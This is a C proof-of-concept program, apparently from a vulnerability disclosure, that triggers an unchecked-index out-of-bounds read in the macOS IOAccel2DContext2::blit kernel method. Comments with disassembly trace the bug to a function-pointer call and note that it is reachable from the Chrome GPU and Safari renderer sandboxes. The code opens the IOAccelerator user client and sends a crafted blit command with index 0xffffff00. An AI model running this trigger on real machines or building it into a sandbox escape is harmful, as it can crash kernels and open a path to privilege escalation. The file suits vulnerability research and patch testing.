// clang -o blit blit.c -framework IOKit

// IOAccel2DContext2::blit

// the index at blit_commands[3] is passed to IOAccelDisplayMachine2::getFullScreenSurface
// without any bounds checking:

// mov     esi, [rbx+0Ch]    <-- this is blit_commands[3] (controlled)
// mov     rdi, [r13+0FA8h]
// call    IOAccelDisplayMachine2::getFullScreenSurface(uint)

// ;IOAccelDisplayMachine2::getFullScreenSurface(unsigned int)
// push    rbp
// mov     rbp, rsp
// mov     eax, esi
// mov     rdi, [rdi+rax*8+88h] <-- OOB read

// this returns a pointer to a complex data structure from which a function pointer will later be called
// in IOAccel2DContext2::blit

// this code is reachable from the chrome GPU process sandbox and the safari renderer sandbox
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <IOKit/IOKitLib.h>

int main(){
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("IOAccelerator");
  if(!matching){
    printf("unable to create service matching dictionary\n");
    return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
    printf("no matches\n");
    return 0;
  }

  io_service_t service = IOIteratorNext(iterator);

  if (service == IO_OBJECT_NULL){
    printf("unable to find service\n");
    return 0;
  }
  printf("got service: %x\n", service);

  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 2, &conn);
  if (err != KERN_SUCCESS){
    printf("unable to get user client connection\n");
    return 0;
  }
  
  printf("got userclient connection: %x\n", conn);

  uint64_t inputScalar[16];  
  uint64_t inputScalarCnt = 0;

  char inputStruct[4096];
  size_t inputStructCnt = 0;

  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;

  char outputStruct[4096];
  size_t outputStructCnt = 0;
  
  inputScalarCnt = 0;

  uint32_t *blit_commands = (uint32_t*)inputStruct;
  // these values requires to reach vulnerable code:
  blit_commands[0] = 1;
  blit_commands[1] = 0;
  blit_commands[2] = 0;
  blit_commands[3] = 0xffffff00; // not validated

  inputStructCnt = 16;

  outputScalarCnt = 0;
  outputStructCnt = 0;

  err = IOConnectCallMethod(
    conn,
    0x102, // blit
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error: %x\n", err);
    return 0;
  }

  printf("called selector 0x102\n");

  return 0;
}
